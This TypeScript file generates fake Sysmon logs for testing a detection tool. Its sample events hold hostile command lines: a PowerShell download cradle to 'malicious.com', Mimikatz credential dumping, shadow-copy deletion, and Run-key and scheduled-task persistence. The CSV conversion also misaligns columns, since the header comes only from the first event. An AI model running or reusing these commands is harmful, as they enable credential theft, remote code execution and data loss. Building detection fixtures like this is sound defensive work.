/**
 * Sample Sysmon Data Generator
 * Creates realistic test data for development and testing
 */

export function generateSampleSysmonCSV(): string {
  const events = [
    // Event 1: Suspicious PowerShell with encoded command
    {
      RecordId: '1001',
      EventID: 1,
      EventRecordID: '1001',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3600000).toISOString(),
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      CommandLine: 'powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A',
      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      ParentCommandLine: 'cmd.exe /c start powershell',
      User: 'DESKTOP-SECURITY\\Administrator',
      LogonId: '0x3E7',
    },
    // Event 2: Download cradle
    {
      RecordId: '1002',
      EventID: 1,
      EventRecordID: '1002',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3500000).toISOString(),
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      CommandLine: 'powershell.exe IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload.ps1")',
      ParentImage: 'C:\\Windows\\explorer.exe',
      User: 'DESKTOP-SECURITY\\User',
      LogonId: '0x45A2B',
    },
    // Event 3: Network connection to suspicious port
    {
      RecordId: '1003',
      EventID: 3,
      EventRecordID: '1003',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3400000).toISOString(),
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      SourceIp: '192.168.1.100',
      SourcePort: '49234',
      DestinationIp: '203.0.113.42',
      DestinationPort: '4444',
      Protocol: 'tcp',
      User: 'DESKTOP-SECURITY\\User',
    },
    // Event 4: Base64 obfuscation
    {
      RecordId: '1004',
      EventID: 4104,
      EventRecordID: '1004',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3300000).toISOString(),
      ScriptBlockText: '$encoded = "SGVsbG8gV29ybGQ="; $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)); IEX $decoded',
    },
    // Event 5: Mimikatz execution
    {
      RecordId: '1005',
      EventID: 1,
      EventRecordID: '1005',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3200000).toISOString(),
      Image: 'C:\\Temp\\mimikatz.exe',
      CommandLine: 'mimikatz.exe sekurlsa::logonpasswords',
      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      User: 'DESKTOP-SECURITY\\Administrator',
      LogonId: '0x3E7',
    },
    // Event 6: Registry persistence
    {
      RecordId: '1006',
      EventID: 13,
      EventRecordID: '1006',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3100000).toISOString(),
      TargetObject: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor',
      Details: 'C:\\Temp\\malware.exe',
      Image: 'C:\\Windows\\regedit.exe',
      User: 'DESKTOP-SECURITY\\Administrator',
    },
    // Event 7: Scheduled task creation
    {
      RecordId: '1007',
      EventID: 1,
      EventRecordID: '1007',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 3000000).toISOString(),
      Image: 'C:\\Windows\\System32\\schtasks.exe',
      CommandLine: 'schtasks /create /tn "SystemUpdate" /tr "C:\\Temp\\backdoor.exe" /sc daily /st 09:00',
      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      User: 'DESKTOP-SECURITY\\Administrator',
      LogonId: '0x3E7',
    },
    // Event 8: Shadow copy deletion
    {
      RecordId: '1008',
      EventID: 1,
      EventRecordID: '1008',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 2900000).toISOString(),
      Image: 'C:\\Windows\\System32\\vssadmin.exe',
      CommandLine: 'vssadmin delete shadows /all /quiet',
      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      User: 'DESKTOP-SECURITY\\Administrator',
      LogonId: '0x3E7',
    },
    // Event 9: Normal process (for comparison)
    {
      RecordId: '1009',
      EventID: 1,
      EventRecordID: '1009',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 2800000).toISOString(),
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      CommandLine: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
      ParentImage: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      User: 'DESKTOP-SECURITY\\User',
      LogonId: '0x45A2B',
    },
    // Event 10: DNS query to suspicious TLD
    {
      RecordId: '1010',
      EventID: 22,
      EventRecordID: '1010',
      Computer: 'DESKTOP-SECURITY',
      TimeCreated: new Date(Date.now() - 2700000).toISOString(),
      QueryName: 'c2server.tk',
      QueryResults: '203.0.113.42',
      Image: 'C:\\Windows\\System32\\svchost.exe',
    },
  ];

  // Convert to CSV
  const headers = Object.keys(events[0]).join(',');
  const rows = events.map(event => {
    return Object.values(event).map(val => {
      // Escape commas and quotes in values
      const str = String(val || '');
      if (str.includes(',') || str.includes('"') || str.includes('\n')) {
        return `"${str.replace(/"/g, '""')}"`;
      }
      return str;
    }).join(',');
  });

  return [headers, ...rows].join('\n');
}

/**
 * Download sample CSV for testing
 */
export function downloadSampleCSV() {
  const csv = generateSampleSysmonCSV();
  const blob = new Blob([csv], { type: 'text/csv' });
  const url = window.URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `sample_sysmon_${Date.now()}.csv`;
  a.click();
  window.URL.revokeObjectURL(url);
}
